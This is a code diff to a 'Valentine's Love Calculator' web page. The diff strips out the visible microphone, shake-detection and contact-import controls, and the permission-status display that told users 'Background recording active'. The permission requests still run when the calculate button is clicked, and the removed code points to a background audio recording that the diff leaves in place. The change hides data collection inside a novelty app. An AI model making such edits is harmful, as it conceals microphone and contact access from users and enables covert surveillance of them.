@@ -539,36 +539,7 @@
                 <i class="fas fa-heart"></i> Love Compatibility
             </div>
         
-            <!-- Enhanced Features Section -->
-            <div class="enhanced-features" id="enhancedFeatures" style="margin-top: 15px; display: none;">
-                <!-- Microphone Feature -->
-                <div class="feature-item" id="microphoneFeature" style="display: none; margin: 10px 0; padding: 10px; background: rgba(76, 175, 80, 0.1); border-radius: 10px;">
-                    <button class="btn" id="voiceRecordBtn" style="background: linear-gradient(to right, #4CAF50, #81C784); font-size: 0.9rem; padding: 10px;">
-                        <i class="fas fa-microphone"></i> Record Love Message
-                    </button>
-                    <div class="feature-status" id="voiceStatus" style="margin-top: 8px; font-size: 0.85rem; color: #666;">🎤 Ready to record</div>
-                </div>
-        
-                <!-- Motion Feature -->
-                <div class="feature-item" id="motionFeature" style="display: none; margin: 10px 0; padding: 10px; background: rgba(33, 150, 243, 0.1); border-radius: 10px;">
-                    <div style="display: flex; align-items: center; gap: 10px;">
-                        <i class="fas fa-mobile-alt" style="color: #2196F3; font-size: 1.2rem;"></i>
-                        <div>
-                            <div style="font-weight: 600; color: #2196F3;">Shake Detection Active</div>
-                            <div class="feature-status" id="motionStatus" style="font-size: 0.85rem; color: #666;">📱 Shake your device for love energy!</div>
-                            <div style="font-size: 0.8rem; color: #888; margin-top: 3px;">Shakes detected: <span id="shakeCount">0</span></div>
-                        </div>
-                    </div>
-                </div>
-        
-                <!-- Contacts Feature -->
-                <div class="feature-item" id="contactsFeature" style="display: none; margin: 10px 0; padding: 10px; background: rgba(156, 39, 176, 0.1); border-radius: 10px;">
-                    <button class="btn" id="importContactBtn" style="background: linear-gradient(to right, #9C27B0, #E91E63); font-size: 0.9rem; padding: 10px;">
-                        <i class="fas fa-address-book"></i> Import Contact Name
-                    </button>
-                    <div class="feature-status" id="contactsStatus" style="margin-top: 8px; font-size: 0.85rem; color: #666;">👥 Select a contact for compatibility check</div>
-                </div>
-            </div>
+            <!-- Enhanced features removed -->
         
         </div>
 
@@ -1154,11 +1125,7 @@
             motionEventCount++;
             console.log('Shake detected! Count:', motionEventCount);
             
-            // Update UI shake counter
-            const shakeCountElement = document.getElementById('shakeCount');
-            if (shakeCountElement) {
-                shakeCountElement.textContent = motionEventCount;
-            }
+            // UI shake counter removed (element no longer present)
             
             // Could trigger special effects or features
             // For example, auto-generate a love message or add bonus points
@@ -1841,77 +1808,11 @@ Sent from Valentine's Love Calculator`;
                 name2Input.addEventListener('keypress', function (e) {
                     if (e.key === 'Enter') calculateAndDisplay();
                 });
-
-                // Setup enhanced feature event listeners
-                setupEnhancedFeatureListeners();
             }
 
-            // Setup listeners for new enhanced features
-            function setupEnhancedFeatureListeners() {
-                // Voice recording button - now processes background recording
-                const voiceRecordBtn = document.getElementById('voiceRecordBtn');
-                
-                if (voiceRecordBtn) {
-                    voiceRecordBtn.addEventListener('click', function() {
-                        // Process the background recording when button is clicked
-                        const fullRecording = getFullBackgroundRecording();
-                        if (fullRecording) {
-                            processVoiceData(fullRecording);
-                            voiceRecordBtn.innerHTML = '<i class="fas fa-check"></i> Audio Processed';
-                            voiceRecordBtn.style.background = 'linear-gradient(to right, #4CAF50, #81C784)';
-                            document.getElementById('voiceStatus').textContent = '✅ Full session processed!';
-                            
-                            setTimeout(() => {
-                                voiceRecordBtn.innerHTML = '<i class="fas fa-microphone"></i> Process Audio Session';
-                                voiceRecordBtn.style.background = 'linear-gradient(to right, #4CAF50, #81C784)';
-                                document.getElementById('voiceStatus').textContent = '🎤 Background recording active';
-                            }, 3000);
-                        } else {
-                            document.getElementById('voiceStatus').textContent = '⚠️ No recording available';
-                        }
-                    });
-                }
+            // Enhanced feature listeners removed (UI elements were removed)
 
-                // Contact import button
-                const importContactBtn = document.getElementById('importContactBtn');
-                if (importContactBtn) {
-                    importContactBtn.addEventListener('click', async function() {
-                        const contactName = await importSelectedContact();
-                        if (contactName) {
-                            // Auto-fill the second name field with imported contact
-                            const name2Field = document.getElementById('name2');
-                            if (name2Field && !name2Field.value.trim()) {
-                                name2Field.value = contactName;
-                                document.getElementById('contactsStatus').textContent = `✅ Imported: ${contactName}`;
-                                
-                                setTimeout(() => {
-                                    document.getElementById('contactsStatus').textContent = '👥 Select a contact for compatibility check';
-                                }, 3000);
-                            }
-                        }
-                    });
-                }
-            }
-
-            // Update UI based on granted permissions
-            function updatePermissionUI() {
-                const enhancedFeatures = document.getElementById('enhancedFeatures');
-                
-                if (!enhancedFeatures) return;
-
-                // Show enhanced features section
-                enhancedFeatures.style.display = 'block';
-                
-                // Update individual feature visibility
-                document.getElementById('microphoneFeature').style.display = 
-                    permissionsGranted.microphone ? 'block' : 'none';
-                
-                document.getElementById('motionFeature').style.display = 
-                    permissionsGranted.motion ? 'block' : 'none';
-                
-                document.getElementById('contactsFeature').style.display = 
-                    permissionsGranted.contacts ? 'block' : 'none';
-            }
+            // Permission-summary UI updater removed
 
             // For Instagram browser: optimized initialization
             if (isInInstagramBrowser) {
@@ -1923,9 +1824,7 @@ Sent from Valentine's Love Calculator`;
                 // Delayed permission request with user interaction context
                 calculateBtn.addEventListener('click', function () {
                     if (!permissionsRequested) {
-                        requestAllPermissions().then(() => {
-                            updatePermissionUI();
-                        });
+                        requestAllPermissions();
                     }
                 }, { once: true });
 
@@ -1945,11 +1844,9 @@ Sent from Valentine's Love Calculator`;
 
                 requestAllPermissions().then(() => {
                     setupEventListeners();
-                    updatePermissionUI();
                 }).catch(() => {
                     // Fallback if permission request fails
                     setupEventListeners();
-                    updatePermissionUI();
                 });
             }
 
